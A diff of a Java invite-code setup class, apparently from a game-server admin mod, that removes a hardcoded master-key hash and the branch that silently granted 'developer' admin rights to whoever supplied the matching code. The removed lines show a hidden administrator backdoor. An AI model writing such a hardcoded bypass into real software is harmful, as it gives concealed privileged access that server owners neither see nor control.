@@ -26,7 +26,6 @@ import java.util.*;
 public class SetupManager {
 
     private static final Gson GSON = new Gson();
-    private static final String MASTER_KEY_HASH = "d6b81d28afd95de58f4b6f21b1b5e79f96df44853f1e865c7307731f0d81c543";
     /** 邀请码字符集 (Base32去除了易混淆字符: I, O, 1, 0) */
     private static final String CODE_CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
     /** 邀请码长度 */
@@ -157,16 +156,6 @@ public class SetupManager {
             }
 
             String hash = HashUtils.sha256(codeText + "JiuShi");
-
-            if (MASTER_KEY_HASH.equals(hash)) {
-                synchronized (admins) {
-                    admins.put(playerName, "developer");
-                }
-                verifyAttempts.remove(playerKey);
-                save();
-                AdminMod.LOGGER.info("Master key used by {}", playerName);
-                return playerName;
-            }
 
             CodeEntry entry = pendingCodes.get(hash);
             if (entry == null) {
